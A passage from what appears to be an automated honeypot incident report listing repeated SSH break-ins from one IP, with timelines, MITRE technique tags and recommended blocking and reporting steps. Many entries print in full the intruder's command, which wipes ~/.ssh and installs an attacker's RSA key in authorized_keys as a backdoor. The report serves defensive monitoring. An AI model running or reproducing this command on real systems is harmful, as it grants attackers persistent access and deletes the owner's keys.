| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:10:47` | `cowrie.session.connect` |
| `2026-05-16 15:10:47` | `cowrie.client.version` |
| `2026-05-16 15:10:48` | `cowrie.client.kex` |
| `2026-05-16 15:10:49` | `cowrie.login.success` |
| `2026-05-16 15:10:50` | `cowrie.session.params` |
| `2026-05-16 15:10:50` | `cowrie.command.input` |
| `2026-05-16 15:10:50` | `cowrie.command.failed` |
| `2026-05-16 15:10:51` | `cowrie.log.closed` |
| `2026-05-16 15:10:51` | `cowrie.session.params` |
| `2026-05-16 15:10:51` | `cowrie.command.input` |
| `2026-05-16 15:10:52` | `cowrie.session.file_download` |
| `2026-05-16 15:10:52` | `cowrie.log.closed` |
| `2026-05-16 15:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044407d50fb7

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:10 |
| **Last Seen** | 2026-05-16 15:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:10:56` | `cowrie.session.connect` |
| `2026-05-16 15:10:56` | `cowrie.client.version` |
| `2026-05-16 15:10:56` | `cowrie.client.kex` |
| `2026-05-16 15:10:57` | `cowrie.login.success` |
| `2026-05-16 15:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91c5251e32f6

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:12 |
| **Last Seen** | 2026-05-16 15:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:12:39` | `cowrie.session.connect` |
| `2026-05-16 15:12:39` | `cowrie.client.version` |
| `2026-05-16 15:12:39` | `cowrie.client.kex` |
| `2026-05-16 15:12:40` | `cowrie.login.success` |
| `2026-05-16 15:12:41` | `cowrie.session.params` |
| `2026-05-16 15:12:41` | `cowrie.command.input` |
| `2026-05-16 15:12:41` | `cowrie.command.failed` |
| `2026-05-16 15:12:42` | `cowrie.log.closed` |
| `2026-05-16 15:12:42` | `cowrie.session.params` |
| `2026-05-16 15:12:42` | `cowrie.command.input` |
| `2026-05-16 15:12:43` | `cowrie.session.file_download` |
| `2026-05-16 15:12:43` | `cowrie.log.closed` |
| `2026-05-16 15:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f61cf651988b

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:12 |
| **Last Seen** | 2026-05-16 15:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:12:47` | `cowrie.session.connect` |
| `2026-05-16 15:12:47` | `cowrie.client.version` |
| `2026-05-16 15:12:47` | `cowrie.client.kex` |
| `2026-05-16 15:12:49` | `cowrie.login.success` |
| `2026-05-16 15:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4709662084

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:14 |
| **Last Seen** | 2026-05-16 15:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:14:24` | `cowrie.session.connect` |
| `2026-05-16 15:14:24` | `cowrie.client.version` |
| `2026-05-16 15:14:24` | `cowrie.client.kex` |
| `2026-05-16 15:14:26` | `cowrie.login.success` |
| `2026-05-16 15:14:26` | `cowrie.session.params` |
| `2026-05-16 15:14:26` | `cowrie.command.input` |
| `2026-05-16 15:14:26` | `cowrie.command.failed` |
| `2026-05-16 15:14:27` | `cowrie.log.closed` |
| `2026-05-16 15:14:28` | `cowrie.session.params` |
| `2026-05-16 15:14:28` | `cowrie.command.input` |
| `2026-05-16 15:14:28` | `cowrie.session.file_download` |
| `2026-05-16 15:14:28` | `cowrie.log.closed` |
| `2026-05-16 15:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6640736edd70

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:14 |
| **Last Seen** | 2026-05-16 15:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:14:32` | `cowrie.session.connect` |
| `2026-05-16 15:14:32` | `cowrie.client.version` |
| `2026-05-16 15:14:32` | `cowrie.client.kex` |
| `2026-05-16 15:14:34` | `cowrie.login.success` |
| `2026-05-16 15:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bb1fdd6892

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:16 |
| **Last Seen** | 2026-05-16 15:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:16:07` | `cowrie.session.connect` |
| `2026-05-16 15:16:07` | `cowrie.client.version` |
| `2026-05-16 15:16:07` | `cowrie.client.kex` |
| `2026-05-16 15:16:09` | `cowrie.login.success` |
| `2026-05-16 15:16:10` | `cowrie.session.params` |
| `2026-05-16 15:16:10` | `cowrie.command.input` |
| `2026-05-16 15:16:10` | `cowrie.command.failed` |
| `2026-05-16 15:16:10` | `cowrie.log.closed` |
| `2026-05-16 15:16:11` | `cowrie.session.params` |
| `2026-05-16 15:16:11` | `cowrie.command.input` |
| `2026-05-16 15:16:11` | `cowrie.session.file_download` |
| `2026-05-16 15:16:11` | `cowrie.log.closed` |
| `2026-05-16 15:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7e3a24e4c53

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:16 |
| **Last Seen** | 2026-05-16 15:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:16:15` | `cowrie.session.connect` |
| `2026-05-16 15:16:15` | `cowrie.client.version` |
| `2026-05-16 15:16:15` | `cowrie.client.kex` |
| `2026-05-16 15:16:17` | `cowrie.login.success` |
| `2026-05-16 15:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774e3ea6ce24

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:17 |
| **Last Seen** | 2026-05-16 15:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:17:52` | `cowrie.session.connect` |
| `2026-05-16 15:17:52` | `cowrie.client.version` |
| `2026-05-16 15:17:52` | `cowrie.client.kex` |
| `2026-05-16 15:17:54` | `cowrie.login.success` |
| `2026-05-16 15:17:55` | `cowrie.session.params` |
| `2026-05-16 15:17:55` | `cowrie.command.input` |
| `2026-05-16 15:17:55` | `cowrie.command.failed` |
| `2026-05-16 15:17:56` | `cowrie.log.closed` |
| `2026-05-16 15:17:56` | `cowrie.session.params` |
| `2026-05-16 15:17:56` | `cowrie.command.input` |
| `2026-05-16 15:17:57` | `cowrie.session.file_download` |
| `2026-05-16 15:17:57` | `cowrie.log.closed` |
| `2026-05-16 15:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41f6b4fc61a

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:18 |
| **Last Seen** | 2026-05-16 15:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:18:01` | `cowrie.session.connect` |
| `2026-05-16 15:18:01` | `cowrie.client.version` |
| `2026-05-16 15:18:01` | `cowrie.client.kex` |
| `2026-05-16 15:18:04` | `cowrie.login.success` |
| `2026-05-16 15:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7cc8421a17a

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:19 |
| **Last Seen** | 2026-05-16 15:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:19:40` | `cowrie.session.connect` |
| `2026-05-16 15:19:40` | `cowrie.client.version` |
| `2026-05-16 15:19:40` | `cowrie.client.kex` |
| `2026-05-16 15:19:42` | `cowrie.login.success` |
| `2026-05-16 15:19:42` | `cowrie.session.params` |
| `2026-05-16 15:19:42` | `cowrie.command.input` |
| `2026-05-16 15:19:42` | `cowrie.command.failed` |
| `2026-05-16 15:19:43` | `cowrie.log.closed` |
| `2026-05-16 15:19:44` | `cowrie.session.params` |
| `2026-05-16 15:19:44` | `cowrie.command.input` |
| `2026-05-16 15:19:44` | `cowrie.session.file_download` |
| `2026-05-16 15:19:44` | `cowrie.log.closed` |
| `2026-05-16 15:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a0dc907c41

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:19 |
| **Last Seen** | 2026-05-16 15:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:19:48` | `cowrie.session.connect` |
| `2026-05-16 15:19:48` | `cowrie.client.version` |
| `2026-05-16 15:19:48` | `cowrie.client.kex` |
| `2026-05-16 15:19:50` | `cowrie.login.success` |
| `2026-05-16 15:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1758656fdff

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:21 |
| **Last Seen** | 2026-05-16 15:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:21:24` | `cowrie.session.connect` |
| `2026-05-16 15:21:24` | `cowrie.client.version` |
| `2026-05-16 15:21:25` | `cowrie.client.kex` |
| `2026-05-16 15:21:26` | `cowrie.login.success` |
| `2026-05-16 15:21:27` | `cowrie.session.params` |
| `2026-05-16 15:21:27` | `cowrie.command.input` |
| `2026-05-16 15:21:27` | `cowrie.command.failed` |
| `2026-05-16 15:21:28` | `cowrie.log.closed` |
| `2026-05-16 15:21:28` | `cowrie.session.params` |
| `2026-05-16 15:21:28` | `cowrie.command.input` |
| `2026-05-16 15:21:29` | `cowrie.session.file_download` |
| `2026-05-16 15:21:29` | `cowrie.log.closed` |
| `2026-05-16 15:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-690dc8616562

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:21 |
| **Last Seen** | 2026-05-16 15:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:21:33` | `cowrie.session.connect` |
| `2026-05-16 15:21:33` | `cowrie.client.version` |
| `2026-05-16 15:21:33` | `cowrie.client.kex` |
| `2026-05-16 15:21:34` | `cowrie.login.success` |
| `2026-05-16 15:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ce5ae0ff16

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:23 |
| **Last Seen** | 2026-05-16 15:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:23:06` | `cowrie.session.connect` |
| `2026-05-16 15:23:06` | `cowrie.client.version` |
| `2026-05-16 15:23:06` | `cowrie.client.kex` |
| `2026-05-16 15:23:08` | `cowrie.login.success` |
| `2026-05-16 15:23:09` | `cowrie.session.params` |
| `2026-05-16 15:23:09` | `cowrie.command.input` |
| `2026-05-16 15:23:09` | `cowrie.command.failed` |
| `2026-05-16 15:23:10` | `cowrie.log.closed` |
| `2026-05-16 15:23:10` | `cowrie.session.params` |
| `2026-05-16 15:23:10` | `cowrie.command.input` |
| `2026-05-16 15:23:10` | `cowrie.session.file_download` |
| `2026-05-16 15:23:10` | `cowrie.log.closed` |
| `2026-05-16 15:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b708ff40debd

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:23 |
| **Last Seen** | 2026-05-16 15:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:23:14` | `cowrie.session.connect` |
| `2026-05-16 15:23:14` | `cowrie.client.version` |
| `2026-05-16 15:23:15` | `cowrie.client.kex` |
| `2026-05-16 15:23:16` | `cowrie.login.success` |
| `2026-05-16 15:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-422addec53da

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:24 |
| **Last Seen** | 2026-05-16 15:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:24:49` | `cowrie.session.connect` |
| `2026-05-16 15:24:49` | `cowrie.client.version` |
| `2026-05-16 15:24:49` | `cowrie.client.kex` |
| `2026-05-16 15:24:51` | `cowrie.login.success` |
| `2026-05-16 15:24:52` | `cowrie.session.params` |
| `2026-05-16 15:24:52` | `cowrie.command.input` |
| `2026-05-16 15:24:52` | `cowrie.command.failed` |
| `2026-05-16 15:24:52` | `cowrie.log.closed` |
| `2026-05-16 15:24:53` | `cowrie.session.params` |
| `2026-05-16 15:24:53` | `cowrie.command.input` |
| `2026-05-16 15:24:53` | `cowrie.session.file_download` |
| `2026-05-16 15:24:53` | `cowrie.log.closed` |
| `2026-05-16 15:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09cd623db414

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:24 |
| **Last Seen** | 2026-05-16 15:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

